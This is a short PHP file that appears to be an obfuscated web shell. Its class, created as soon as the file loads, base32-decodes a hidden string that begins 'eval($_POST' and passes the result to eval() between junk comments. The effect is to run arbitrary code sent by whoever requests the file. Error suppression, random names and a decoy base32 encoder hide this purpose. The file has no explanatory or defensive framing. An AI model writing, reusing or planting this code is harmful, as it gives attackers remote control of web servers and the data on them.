<?php
class DPFL{
        public $QVWR = null;
        public $PIMH = null;
        function __construct(){
        $this->QVWR = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy';
        $this->PIMH = @IWNE($this->QVWR);
        @eval("/*NAHt=|u*/".$this->PIMH."/*NAHt=|u*/");
        }}
new DPFL();
function YOKI($BAWK){
    $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
    $DELA = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($BAWK); $i < $j; $i++){
    $v <<= 8;
        $v += ord($BAWK[$i]);
        $vbits += 8;
        while ($vbits >= 5) {
            $vbits -= 5;
            $DELA .= $BASE32_ALPHABET[$v >> $vbits];
            $v &= ((1 << $vbits) - 1);}}
    if ($vbits > 0){
        $v <<= (5 - $vbits);
        $DELA .= $BASE32_ALPHABET[$v];}
    return $DELA;}
function IWNE($BAWK){
    $DELA = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($BAWK); $i < $j; $i++){
        $v <<= 5;
        if ($BAWK[$i] >= 'a' && $BAWK[$i] <= 'z'){
            $v += (ord($BAWK[$i]) - 97);
        } elseif ($BAWK[$i] >= '2' && $BAWK[$i] <= '7') {
            $v += (24 + $BAWK[$i]);
        } else {
            exit(1);
        }
        $vbits += 5;
        while ($vbits >= 8){
            $vbits -= 8;
            $DELA .= chr($v >> $vbits);
            $v &= ((1 << $vbits) - 1);}}
    return $DELA;}
?>